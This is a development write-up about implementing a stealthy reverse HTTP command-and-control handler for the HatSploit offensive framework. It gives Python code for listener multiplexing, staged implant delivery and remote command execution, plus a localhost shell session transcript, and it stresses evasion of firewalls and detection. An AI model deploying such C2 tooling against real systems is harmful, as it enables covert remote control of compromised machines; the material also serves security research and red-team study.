---
title: Building HatSploit Reverse HTTP Handler
categories: [Development]
tags: [hatsploit, development]
author: enty8080
---

In offensive security development, communication between a listener (the "C2" or Command & Control) and an implant is the most critical link. While raw TCP shells are common, **HTTP** is often the preferred choice because it effortlessly blends into legitimate web traffic and bypasses restrictive firewalls.

Today, I’m walking through the implementation of a custom **Reverse HTTP Handler** and **Session Wrapper** built for the HatSploit framework. We will look at how the handler manages incoming staging and how the payload is expected to "speak" back to us.

## 1. The Core Concept: How Reverse HTTP Works

At its heart, **Reverse HTTP** is a twist on the classic reverse shell model. Instead of maintaining a long-lived TCP connection back to the attacker, the payload behaves like a **legitimate HTTP client**, repeatedly initiating short-lived HTTP requests to a server it controls.

In a traditional reverse TCP shell, the moment the connection is established, it stays open. That model is simple and fast — but also noisy and fragile. Firewalls, NAT, proxies, and intrusion detection systems are all very good at spotting or killing unusual outbound TCP connections.

Reverse HTTP avoids this by blending into normal web traffic.

### Poll-Based Command Retrieval

Rather than “connecting once and staying connected,” a reverse HTTP payload operates on a **polling loop**:

* It wakes up at regular intervals
* Makes an outbound HTTP request
* Asks the server whether there is work to do
* Goes back to sleep if there isn’t

From a network perspective, this looks almost indistinguishable from a normal application talking to a REST API.

### The Request–Response Flow

A typical interaction looks like this:

#### 1. GET Request — Command Check-In

The payload sends an HTTP `GET` request to the handler:

> “Do you have any commands for me?”

This request may include metadata such as a session ID, host identifier, or basic system information. If no commands are queued, the server responds with an empty body or a benign status code.

#### 2. Response — Command Delivery

When a command *is* available, the handler embeds it in the HTTP response body:

```
whoami
```

From the payload’s point of view, this is just another HTTP response — it does not need to keep stateful sockets or worry about connection drops.

#### 3. POST Request  —  Result Submission

After executing the command locally, the payload sends the output back using an HTTP `POST` request:

> “Here is the result of the work you gave me.”

This POST typically contains:

* Standard output
* Standard error
* Execution status or exit code

The handler processes and stores this data, making it available to the operator.

### Why This Model Matters

Reverse HTTP trades **interactivity** for **reliability and stealth**:

* Works through restrictive firewalls and proxies
* Uses allowed outbound ports (80/443)
* Survives dropped connections effortlessly
* Looks like normal web traffic

The payload never waits for inbound connections, never exposes a listening port, and never depends on a fragile TCP session. Every interaction is self-contained and recoverable.

This request-driven model is the foundation for reverse HTTP payloads in HatSploit. Once you understand that the payload is essentially a **remote task worker speaking HTTP**, the rest of the handler design becomes much easier to reason about.

## 2. Implementing the Handler

In a reverse HTTP architecture, the **handler** becomes more than just a listener — it is effectively a **command-and-delivery server**. Its responsibilities go beyond accepting connections and extend into session multiplexing, payload delivery, and state tracking.

In HatSploit, this role is fulfilled by the `ReverseHTTPHandler`, which sets up the HTTP listener and orchestrates the **staging process** — the controlled delivery of the full implant to the target.

### Sharing a Single Listener with Multiple Paths

One of the challenges with HTTP-based payloads is scalability. Binding a new port for every session is impractical and unnecessary, especially when HTTP naturally supports routing via URI paths.

To solve this, the handler allows **multiple reverse HTTP sessions to share the same host and port**, distinguished by unique URI paths (`LPATH`).

```python
# Check if a listener is already running on this host/port
listener_jobs = local_storage.get("reverse_http_listeners", {})
data = next((d for d in listener_jobs.values() 
            if d["Host"] == self.lhost.value and d["Port"] == self.lport.value), None)

if data:
    # If the port is busy but the path is new, we just add the path
    if self.lpath.value in data["Paths"]:
        raise RuntimeError("Use different LHOST, LPORT and/or LPATH!")
    listener = data["Object"]
    data["Paths"].append(self.lpath.value)
else:
    # Otherwise, spin up a new HTTPListener
    listener = HTTPListener(self.lhost.value, self.lport.value)
    listener.listen()
```

Conceptually:

* One HTTP server listens on `LHOST:LPORT`
* Each payload is assigned a unique endpoint, such as:

  * `/update`
  * `/api/v1/check`
  * `/assets/img`

This mirrors how real web applications behave and avoids spawning redundant listeners.

The handler first checks whether a listener is already active on the requested host and port. If it is, and the requested path is new, the handler simply **registers the path** and reuses the existing listener. Only when the port is unused does it spin up a new HTTP server instance.

This design provides several benefits:

* Reduced resource usage
* Cleaner operator workflow
* More realistic HTTP traffic patterns
* Multiple sessions behind a single port

From the payload’s perspective, it is talking to its own dedicated endpoint — even though the backend infrastructure is shared.

### Staging: Delivering the Implant in Steps

Reverse HTTP payloads frequently use **staging** to minimize their initial footprint. Instead of dropping the full implant immediately, the payload downloads it in multiple steps, often starting with a tiny bootstrapper.

The handler must therefore answer a simple but crucial question on every request:

> *“What stage is this client currently on?”*

```python
# --- Case: Staged ---
step = context['stage_tracker'].get(client_ip, 0)
step_method = '' if not step else str(step)

if hasattr(payload.payload, f'stage{step_method}'):
    stage = payload.run(method=f'stage{step_method}')
    request.send_status(200)
    request.wfile.write(stage) # Send the next stage (dll, shellcode, etc)
    context['stage_tracker'][client_ip] = step + 1
```

### Tracking Progress Per Client

HatSploit handles this by maintaining a `stage_tracker`, keyed by the client’s IP address. Each incoming request is mapped to a numeric stage counter:

* Stage 0 → initial loader
* Stage 1 → secondary payload
* Stage 2 → final implant

When a client makes a request:

1. The handler looks up the client’s current stage
2. It checks whether the payload defines a corresponding stage method (`stage`, `stage1`, `stage2`, etc.)
3. If it does, that stage is generated and sent back in the HTTP response
4. The client’s stage counter is incremented

Each HTTP response delivers exactly **one step of the payload**, keeping responses small and controlled.

### Why This Matters

This staged, request-driven model has several important advantages:

* **Reliability:** If a request fails, the client can retry without corrupting the delivery process
* **Stealth:** Small, incremental responses blend better into normal HTTP traffic
* **Flexibility:** Payloads can define arbitrary staging logic without modifying the handler
* **State Isolation:** Each client progresses independently, even when sharing the same listener

Crucially, the handler never *pushes* data. Every stage is delivered only when the payload explicitly asks for it, reinforcing the reverse HTTP philosophy: **the target always initiates communication**.

By combining path-based multiplexing with per-client staging state, the `ReverseHTTPHandler` becomes a lightweight but powerful delivery engine — capable of serving multiple implants, at different stages, over a single, innocuous-looking HTTP service.

## 3. The Session: Asynchronous Command Execution

Once the payload is fully executed on the target, the `HatSploitSessionHTTP` takes over. This class handles the actual "conversation."

Because HTTP is stateless, we can't just "send" a command. We have to **queue** it and wait for the payload to check in. We use `threading.Event` to synchronize this.

### The Execute Loop

When you type a command in the console, the following occurs:

```python
def execute(self, command: str, output: bool = False) -> Union[None, str]:
    self.output_event.clear()
    self.queued_command = command # Queue the command
    self.command_event.set()

    if output:
        # Wait for the POST callback to set the output_event
        if self.output_event.wait(timeout=30):
            result = self.queued_output
            return result

```

### The Payload's Expected Behavior

For this session to work, the payload (implant) must follow this specific protocol:

1. **Beaconing:** Send a `GET` request to the listener URL.
2. **Execution:** Take the body of the `GET` response and execute it as a system command.
3. **Reporting:** Send a `POST` request back to the same URL containing the command's output in the request body.

```python
def post_method(request):
    content_length = int(request.headers.get("Content-Length", 0))
    data = request.rfile.read(content_length).decode(errors='ignore')

    # This data is the output from the target's command
    self.queued_output = data
    self.output_event.set() # Signals execute() that data is ready
    request.send_response(200)

```

## 4. Interaction Mode

While reverse HTTP is often associated with queued, asynchronous command execution, HatSploit also supports an **Interactive Mode** that restores the feel of a traditional shell — without abandoning the reverse HTTP model.

The key difference is *who drives the timing*.

In normal (queued) mode, the operator submits a command, it is stored server-side, and the payload retrieves it during its next polling interval. In **Interactive Mode**, the handler flips this around: **every payload check-in becomes an opportunity for real-time interaction**.

### Turning Polling into a “Hot” Loop

When interactive mode is enabled, the handler no longer waits for pre-queued commands. Instead, it immediately prompts the operator the moment the payload connects back.

Conceptually, the flow looks like this:

1. Payload performs its regular HTTP check-in
2. Handler detects interactive mode
3. Operator is prompted instantly
4. Input is returned as the HTTP response
5. Payload executes the command and POSTs the result
6. Payload checks in again → repeat

This preserves the reverse HTTP contract — the payload *always* initiates communication — but creates the illusion of a live shell.

### Interactive Dispatch Logic

At the handler level, this behavior is intentionally minimal. When a request arrives and interactive mode is active, the handler simply blocks briefly, waiting for operator input, and returns it as the HTTP response body:

```python
def get_method(request):
    if self.interactive:
        # Prompt the user immediately when the payload checks in
        body = self.input_empty(self.prompt).strip()
        request.send_response(200)
        request.wfile.write(body.encode())
```

There is no command queue, no buffering, and no persistent socket. Each command exists only for the lifetime of a single HTTP request–response pair.

### What This Looks Like in Practice

From the operator’s perspective, this feels remarkably close to a standard interactive shell, even though the transport layer is pure HTTP polling.

Below is a real session preview showing interactive reverse HTTP in action:

```entysec
                     ___________
                    < HatSploit >
                     -----------
                .''    /
      ._.-.___.' (`\  /
     //(        ( `'
    '/ )\ ).__. )
    ' <' `\ ._/'\
       `   \     \

    --=[ HatSploit Framework 3.0.0 unfulf1ll3d (https://hatsploit.com)
--==--=[ Developed by EntySec (https://entysec.com)
    --=[ 55 modules | 67 payloads | 2 encoders | 4 plugins

HatSploit Tip: Use jobs -k to kill broken job manualy

[hsf3]> use exploit/generic/handler
[hsf3: Generic Handler]> set payload linux/x64/shell_reverse_http
[i] payload => linux/x64/shell_reverse_http
[hsf3: Generic Handler]> set lhost localhost
[i] lhost => localhost
[hsf3: Generic Handler]> set lport 8000
[i] lport => 8000
[hsf3: Generic Handler]> run

[*] Starting HTTP listener on http://127.0.0.1:8000/...
[*] Handler waiting for payload check-in...
[*] Establishing connection (127.0.0.1:62322 -> 127.0.0.1:8000)...
[+] Shell session 0 opened at 2026-01-10 17:23:35 GMT!
[+] Exploit module completed!
```

Once the session is opened, switching to interactive mode immediately ties operator input to payload check-ins:

```entysec
[hsf3: Generic Handler]> sessions -s 0 -i
[*] Interacting with session 0...

[*] Waiting for connect ... connect from 127.0.0.1:62324
% ls -al /
```

Notice the phrasing: **“Waiting for connect”**. This is the critical detail. The handler is not pushing commands — it is waiting for the *next poll* from the payload.

When the payload checks in again, the command is delivered, executed, and the output is returned:

```entysec
[*] Waiting for connect ... connect from 127.0.0.1:62325
total 96
drwxr-xr-x 22 root root  4096 Dec  9  2013 .
drwxr-xr-x 22 root root  4096 Dec  9  2013 ..
drwxr-xr-x  2 root root  4096 Dec  9  2013 bin
drwxr-xr-x  3 root root  4096 Dec  9  2013 boot
drwxr-xr-x 13 root root  2960 Jan 10 15:52 dev
drwxr-xr-x 67 root root  4096 Jan 10 15:52 etc
drwxr-xr-x  3 root root  4096 Dec  9  2013 home
lrwxrwxrwx  1 root root    30 Dec  9  2013 initrd.img -> boot/initrd.img-2.6.32-5-amd64
drwxr-xr-x 11 root root 12288 Dec  1  2024 lib
drwxr-xr-x  2 root root  4096 Dec  9  2013 lib32
lrwxrwxrwx  1 root root     4 Dec  9  2013 lib64 -> /lib
drwx------  2 root root 16384 Dec  9  2013 lost+found
drwxr-xr-x  4 root root  4096 Dec  9  2013 media
drwxr-xr-x  2 root root  4096 Sep 22  2013 mnt
drwxr-xr-x  2 root root  4096 Dec  9  2013 opt
dr-xr-xr-x 71 root root     0 Jan 10 15:52 proc
drwx------  3 root root  4096 Jan  5 16:01 root
drwxr-xr-x  2 root root  4096 Dec  9  2013 sbin
drwxr-xr-x  2 root root  4096 Jul 21  2010 selinux
drwxr-xr-x  2 root root  4096 Dec  9  2013 srv
drwxr-xr-x 13 root root     0 Jan 10 15:52 sys
drwxrwxrwt  2 root root  4096 Jan 10 17:17 tmp
Press Enter for more, 'a' for all, 'q' to quit:
```

Each output block corresponds to a *separate HTTP round trip*. The shell feels interactive, but under the hood it is still stateless, request-driven communication.

### Why Interactive Mode Works So Well Over HTTP

This approach intentionally embraces HTTP’s constraints instead of fighting them:

* No persistent sockets
* No fragile long-lived connections
* Clean recovery if a poll is missed
* Full compatibility with staging and multiplexed paths

Most importantly, it preserves the **illusion of immediacy** while retaining the stealth and reliability benefits of reverse HTTP.

Interactive Mode demonstrates that reverse HTTP payloads are not limited to fire-and-forget tasking. With careful handler design, they can deliver a surprisingly fluid operator experience — without ever violating the rule that defines them:

> **The payload always calls home first.**
